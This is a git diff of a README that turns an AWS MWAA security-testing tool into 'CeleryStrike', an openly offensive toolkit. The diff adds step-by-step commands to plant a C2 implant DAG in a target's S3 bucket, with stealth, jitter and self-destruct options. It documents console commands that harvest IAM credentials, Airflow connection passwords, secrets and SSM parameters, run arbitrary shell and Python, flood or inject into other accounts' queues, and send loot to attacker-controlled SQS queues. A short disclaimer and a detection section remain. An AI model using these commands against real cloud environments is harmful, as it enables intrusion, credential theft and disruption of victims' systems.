@@ -1,208 +1,230 @@
-# AWS-MWAA-SQS-Execution-Role-Research
+# CeleryStrike
 
-![unnamed](https://github.com/user-attachments/assets/1f615e51-37ea-4303-8779-6dbd9e09f68d)
+**AWS MWAA Execution Role Exploitation Toolkit**
 
-## Security Testing Tool
+<p align="center">
+<img src="https://github.com/user-attachments/assets/1f615e51-37ea-4303-8779-6dbd9e09f68d" alt="CeleryStrike" width="600"/>
+</p>
 
-A comprehensive offensive security testing toolkit for validating AWS MWAA execution role SQS policy vulnerabilities. This tool covers all five attack vectors documented in the [research](aws-mwaa-post-exploitation.md):
-
-1. **Data Exfiltration** -- Send data to attacker-controlled SQS queues
-2. **Command & Control** -- Bidirectional C2 channel via SQS with interactive operator console
-3. **Denial of Service** -- Message flooding and consumption attacks
-4. **Cross-Account Event Injection** -- Inject crafted payloads into target queues
-5. **Infrastructure Reconnaissance** -- Enumerate airflow-celery-* queues across accounts
-
-Plus defensive capabilities:
-- **IAM Policy Analyzer** -- Detect the vulnerable SQS wildcard pattern in execution roles
-- **DAG Payload Generator** -- Generate ready-to-deploy Airflow DAGs for each attack vector
-- **Detection Rule Generator** -- AWS Config Guard rules and CloudWatch Insights queries
+CeleryStrike weaponizes the default AWS MWAA execution role's wildcard SQS policy (`arn:aws:sqs:*:*:airflow-celery-*`) to establish full command-and-control over Airflow workers. A single DAG upload gives you an interactive C2 implant with built-in credential harvesting, cross-account recon, event injection, and more — all tunneled through SQS queues that blend in with legitimate Celery traffic.
 
 > **For authorized security testing, penetration testing engagements, and defensive validation only.**
 
-### Installation
+See [aws-mwaa-post-exploitation.md](aws-mwaa-post-exploitation.md) for the full vulnerability research.
+
+---
+
+## Attack Flow
+
+```
+                         ┌─────────────────────┐
+                         │   Attacker Machine   │
+                         │                      │
+                         │   celerystrike       │
+                         │   connect ...        │
+                         └──────┬───────────────┘
+                                │  SQS (airflow-celery-c2-*)
+                    ┌───────────┴───────────┐
+                    ▼                       ▼
+          ┌─────────────────┐    ┌─────────────────┐
+          │  Command Queue  │    │  Results Queue   │
+          │  (attacker acct)│    │  (attacker acct) │
+          └────────┬────────┘    └────────▲────────┘
+                   │  poll                │  send
+                   ▼                      │
+          ┌────────────────────────────────┐
+          │     MWAA Airflow Worker        │
+          │                                │
+          │  C2 Implant DAG                │
+          │  ├── !harvest-creds            │
+          │  ├── !airflow-dump             │
+          │  ├── !s3-recon                 │
+          │  ├── !secrets / !ssm-params    │
+          │  ├── !recon (cross-account)    │
+          │  ├── !inject (cross-account)   │
+          │  ├── !dos-flood                │
+          │  ├── !pivot / !multi           │
+          │  └── shell / python:           │
+          └────────────────────────────────┘
+```
+
+## Installation
 
 ```bash
-pip install -r requirements.txt
+git clone https://github.com/AI-redteam/AWS-MWAA-SQS-Execution-Role-Research.git
+cd AWS-MWAA-SQS-Execution-Role-Research
 
-# Or install as a CLI tool:
 pip install -e .
 ```
 
-### Quick Start
+## Quick Start
+
+### Option A: Full automated pipeline
 
 ```bash
-# Run all safe capability tests (uses your own account as source + target)
-python -m mwaa_security_tool --attacker-account 123456789012 full-test
+# 1. Deploy everything — creates SQS queues, generates C2 DAG, uploads to target S3
+celerystrike deploy all \
+  --attacker-account 123456789012 \
+  --target-bucket mwaa-dags-prod \
+  --target-profile compromised-role \
+  --stealth --jitter 30
 
-# Analyze an IAM role for the vulnerable policy
-python -m mwaa_security_tool analyze role --role-name MyMWAAExecutionRole
+# 2. Connect to the implant
+celerystrike connect --attacker-account 123456789012
 
-# Full MWAA environment assessment
-python -m mwaa_security_tool analyze full
+  c2> !exfil                          # harvest creds, secrets, connections — all at once
+  c2> !recon 999999999999             # scan another account for MWAA queues
+  c2> !inject 999 airflow-celery-prod sqli_probe
+  c2> whoami                          # arbitrary shell command
+  c2> python:import boto3; ...        # arbitrary Python
 
-# Generate detection rules
-python -m mwaa_security_tool analyze detection-rules --output-dir ./detection_rules
+# 3. Cleanup
+celerystrike teardown --attacker-account 123456789012 --self-destruct
 ```
 
-### Module Reference
-
-#### Data Exfiltration (`exfil`)
+### Option B: Step-by-step
 
 ```bash
-# Set up attacker-side receiving queue
-python -m mwaa_security_tool --attacker-account ACCT_ID exfil setup
+# Create attacker-side SQS queues only
+celerystrike deploy queues --attacker-account 123456789012
 
-# Listen for exfiltrated data
-python -m mwaa_security_tool --attacker-account ACCT_ID exfil listen --duration 600
+# Generate the implant DAG locally (for review / manual upload)
+celerystrike deploy generate --attacker-account 123456789012 --stealth --output-dir ./dags
 
-# Direct test (no MWAA required -- validates cross-account SQS send)
-python -m mwaa_security_tool --attacker-account ACCT_ID --source-profile victim exfil test
+# Upload separately
+celerystrike deploy upload \
+  --file ./dags/dag_c2_implant.py \
+  --target-bucket mwaa-dags-prod \
+  --target-profile compromised-role
 
-# Cleanup
-python -m mwaa_security_tool --attacker-account ACCT_ID exfil cleanup
+# Connect when ready
+celerystrike connect --attacker-account 123456789012
 ```
 
-#### Command & Control (`c2`)
+## Commands
+
+| Command | Description |
+|---------|-------------|
+| `deploy all` | Full pipeline: create queues + generate C2 DAG + upload to S3 |
+| `deploy queues` | Only create attacker-side SQS queues |
+| `deploy generate` | Only generate the C2 implant DAG locally |
+| `deploy upload` | Only upload a DAG file to the target S3 bucket |
+| `connect` | Interactive C2 operator console |
+| `recon` | Pre-attack account scanning (external, no implant needed) |
+| `analyze` | Blue team IAM policy analysis & detection rule generation |
+| `teardown` | Delete queues + optional `!self-destruct` to the implant |
+| `test` | End-to-end validation suite (uses your own account, no MWAA needed) |
+
+## C2 Console Commands
+
+Once connected via `celerystrike connect`, the operator console supports:
+
+### Built-in Modules
+| Command | What it does |
+|---------|-------------|
+| `!harvest-creds` | STS identity, env vars, IMDS credentials, container creds |
+| `!airflow-dump` | Connections (with passwords), variables, pools |
+| `!s3-recon` | Enumerate buckets, sample objects, read policies |
+| `!secrets` | List & read Secrets Manager secrets |
+| `!ssm-params` | List & read SSM parameters (with decryption) |
+| `!iam-enum` | Role details, attached & inline policies |
+| `!network-recon` | Interfaces, routes, VPCs, subnets, security groups |
+| `!exfil` | Run all of the above in one batch |
+
+### Remote Attack Operations
+| Command | What it does |
+|---------|-------------|
+| `!recon <accts> [region]` | Scan accounts for `airflow-celery-*` queues from inside MWAA |
+| `!inject <acct> <queue> <payload> [region]` | Inject named payload (e.g. `sqli_probe`) or raw JSON |
+| `!dos-flood <acct> <queue> [count] [region]` | Flood a target queue with messages |
+
+### File Ops & Advanced
+| Command | What it does |
+|---------|-------------|
+| `!read-file <path>` | Read a file from the worker |
+| `!write-file <path> <b64>` | Write base64 content to a file |
+| `!pivot <acct> <queue> <msg>` | Send a message to another account's queue |
+| `!multi` | Batch multiple commands |
+| `!self-destruct` | Remove the implant DAG and cached bytecode |
+| `python:<code>` | Execute arbitrary Python |
+| `<anything else>` | Execute as shell command |
+
+## Blue Team: Analysis & Detection
+
+CeleryStrike also includes defensive capabilities for validating your environment:
 
 ```bash
-# Set up C2 infrastructure (command + results queues)
-python -m mwaa_security_tool --attacker-account ACCT_ID c2 setup
+# Analyze a specific MWAA execution role for the vulnerable policy
+celerystrike analyze role --role-name AmazonMWAA-MyEnv-ExecutionRole
 
-# Interactive operator console
-python -m mwaa_security_tool --attacker-account ACCT_ID c2 operator
+# Enumerate all MWAA environments and analyze their roles
+celerystrike analyze full --region us-east-1 --profile security-audit
 
-# Send a single command
-python -m mwaa_security_tool --attacker-account ACCT_ID c2 send "whoami"
-
-# Full roundtrip test (no MWAA required)
-python -m mwaa_security_tool --attacker-account ACCT_ID --source-profile victim c2 test
-
-# Cleanup
-python -m mwaa_security_tool --attacker-account ACCT_ID c2 cleanup
+# Generate AWS Config Guard rules + CloudWatch Insights queries
+celerystrike analyze detection-rules --output-dir ./detection_rules
 ```
 
-The operator console includes built-in macros:
-- `!airflow-conns` -- Dump all Airflow connection credentials
-- `!env` -- Dump environment variables
-- `!s3-list` -- List accessible S3 buckets
-- `!iam-whoami` -- Get the caller identity
+## Pre-Attack Recon (No Implant Needed)
 
-#### Denial of Service (`dos`)
-
-```bash
-# Safe DoS risk assessment (creates/destroys temp queues)
-python -m mwaa_security_tool --attacker-account ACCT_ID dos assess
-
-# Controlled flood test (rate-limited, capped at 100 messages)
-python -m mwaa_security_tool --attacker-account ACCT_ID dos flood --message-count 100
-
-# Message consumption test (dry run by default)
-python -m mwaa_security_tool --attacker-account ACCT_ID dos consume \
-    --target-queue-url https://sqs.us-east-1.amazonaws.com/ACCT/QUEUE
-```
-
-#### Event Injection (`inject`)
-
-```bash
-# List available injection probe payloads
-python -m mwaa_security_tool inject list-payloads
-
-# Send a benign marker to a target queue
-python -m mwaa_security_tool --source-profile victim inject send \
-    --target-account TARGET_ACCT --target-queue airflow-celery-ingest --payload benign
-
-# Send all probe payloads (SQLi, CMDi, deserialization, SSTI, XXE markers)
-python -m mwaa_security_tool --source-profile victim inject send-all \
-    --target-account TARGET_ACCT --target-queue airflow-celery-ingest
-
-# Safe self-target test
-python -m mwaa_security_tool --attacker-account ACCT_ID inject test
-```
-
-#### Infrastructure Reconnaissance (`recon`)
+Scan for `airflow-celery-*` queues across accounts using `sqs:GetQueueUrl` — works with any AWS credentials that have SQS access:
 
 ```bash
 # Scan specific accounts
-python -m mwaa_security_tool --source-profile victim recon scan \
-    --accounts 111111111111,222222222222,333333333333
-
-# Scan from a file of account IDs
-python -m mwaa_security_tool --source-profile victim recon scan \
-    --accounts account_ids.txt --threads 10
+celerystrike recon --accounts 111111111111,222222222222
 
 # Scan a numeric range
-python -m mwaa_security_tool --source-profile victim recon scan-range \
-    --start 100000000000 --count 500 --threads 10
-
-# Test recon capability
-python -m mwaa_security_tool --attacker-account ACCT_ID recon test
+celerystrike recon --start 100000000000 --count 500 --threads 10
 ```
 
-#### DAG Payload Generator (`dag`)
+## Validation Suite
+
+Run all safe capability tests using your own account as both attacker and target (no MWAA environment needed):
 
 ```bash
-# Generate all DAG payloads
-python -m mwaa_security_tool --attacker-account ACCT_ID dag generate \
-    --output-dir ./generated_dags --target-accounts 111111111111,222222222222
-
-# Generate specific DAG type
-python -m mwaa_security_tool --attacker-account ACCT_ID dag generate --type c2
-
-# Upload a DAG to the target MWAA S3 bucket
-python -m mwaa_security_tool dag upload \
-    --file ./generated_dags/dag_c2_implant.py \
-    --bucket mwaa-dags-bucket --target-profile victim
+celerystrike test \
+  --attacker-account 123456789012 \
+  --source-profile victim-role-simulator
 ```
 
-#### Policy Analyzer (`analyze`)
+This runs C2 roundtrip, DoS assessment, event injection, and recon tests.
 
-```bash
-# Analyze a specific role
-python -m mwaa_security_tool analyze role --role-name AmazonMWAA-MyEnv-ExecutionRole
-
-# Enumerate all MWAA environments
-python -m mwaa_security_tool --attacker-profile victim analyze enumerate
-
-# Full assessment (enumerate + analyze all roles)
-python -m mwaa_security_tool --attacker-profile victim analyze full
-
-# Generate detection rules (Config Guard + CloudWatch Insights)
-python -m mwaa_security_tool analyze detection-rules --output-dir ./detection_rules
-```
-
-### Architecture
+## Architecture
 
 ```
-mwaa_security_tool/
+celerystrike/
 ├── __init__.py
-├── __main__.py              # python -m entry point
-├── cli.py                   # Main CLI with argparse
-├── config.py                # Shared constants and dataclasses
-├── utils.py                 # SQS/S3/IAM helpers, logging, formatting
-├── modules/
-│   ├── exfiltration.py      # Data exfiltration testing
-│   ├── c2_channel.py        # C2 channel with operator console
-│   ├── dos_simulation.py    # DoS simulation (rate-limited)
-│   ├── event_injection.py   # Cross-account event injection probes
-│   ├── recon.py             # Infrastructure reconnaissance scanner
-│   ├── dag_generator.py     # Airflow DAG payload generator
-│   └── policy_analyzer.py   # IAM policy analysis & detection rules
-└── dag_payloads/            # Generated DAG files output directory
+├── __main__.py              # python -m celerystrike
+├── cli.py                   # CLI entry point (6 commands)
+├── config.py                # Constants and dataclasses
+├── utils.py                 # SQS/S3/IAM helpers, logging
+└── modules/
+    ├── c2_channel.py        # C2 infra + interactive operator console
+    ├── dag_generator.py     # Generates the C2 implant DAG with all builtins
+    ├── dos_simulation.py    # DoS risk assessment & controlled flooding
+    ├── event_injection.py   # Cross-account event injection probes
+    ├── recon.py             # Infrastructure reconnaissance scanner
+    └── policy_analyzer.py   # IAM analysis & detection rule generation
 ```
 
-### Cross-Account Testing
+## The Vulnerability
 
-Most tests support a `--source-profile` flag to simulate the MWAA execution role using a different AWS profile than the attacker. This allows testing with two separate AWS accounts:
+AWS MWAA's default execution role includes a wildcard SQS policy:
 
-```bash
-# Attacker profile owns the receiving queues
-# Source profile simulates the compromised MWAA execution role
-python -m mwaa_security_tool \
-    --attacker-account 111111111111 --attacker-profile attacker \
-    --source-profile victim \
-    full-test
+```json
+{
+  "Effect": "Allow",
+  "Action": [
+    "sqs:ChangeMessageVisibility",
+    "sqs:DeleteMessage",
+    "sqs:GetQueueAttributes",
+    "sqs:GetQueueUrl",
+    "sqs:ReceiveMessage",
+    "sqs:SendMessage"
+  ],
+  "Resource": "arn:aws:sqs:*:*:airflow-celery-*"
+}
 ```
 
-### Related Research
+The `*:*` in the resource ARN means **any account, any region**. Any queue named `airflow-celery-*` in any AWS account is accessible to the MWAA worker. CeleryStrike exploits this by creating attacker-controlled queues that match the pattern, establishing a full C2 channel that's indistinguishable from legitimate Celery task traffic.
 
-See [aws-mwaa-post-exploitation.md](aws-mwaa-post-exploitation.md) for the full vulnerability analysis.
+See [aws-mwaa-post-exploitation.md](aws-mwaa-post-exploitation.md) for the complete vulnerability analysis.
